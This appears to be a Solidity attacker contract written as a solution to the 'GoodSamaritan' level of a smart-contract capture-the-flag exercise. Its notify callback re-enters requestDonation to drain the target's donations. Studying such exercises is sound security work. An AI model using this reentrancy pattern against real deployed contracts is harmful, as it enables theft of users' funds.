pragma solidity ^0.8.0;

import "../levels/GoodSamaritan.sol";

contract ReentryAttacker {
    GoodSamaritan private immutable goodSamaritan;
    address public immutable walletAddress;
    address public immutable coinAddress;

    constructor(address _goodSamaritan) {
        goodSamaritan = GoodSamaritan(_goodSamaritan);
        walletAddress = address(goodSamaritan.wallet());
        coinAddress = address(goodSamaritan.coin());
    }

    function notify(uint) external {
        // Reentrancy: call again to trigger new donations
        goodSamaritan.requestDonation();
    }

    function attack() external {
        // Start the reentrancy loop
        goodSamaritan.requestDonation();
    }
}
